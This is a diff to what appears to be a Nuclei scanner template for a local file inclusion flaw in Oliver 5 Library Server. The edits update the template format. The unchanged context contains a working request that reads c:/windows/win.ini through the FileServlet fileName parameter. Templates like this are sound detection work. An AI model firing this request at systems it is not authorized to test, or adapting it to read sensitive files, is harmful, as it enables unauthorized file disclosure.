@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: oliver-library-lfi
 info:
   name: Oliver 5 Library Server <8.00.008.053 - Local File Inclusion
@@ -12,7 +13,7 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   tags: windows,lfi,oliver
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/oliver/FileServlet?source=serverFile&fileName=c:/windows/win.ini"
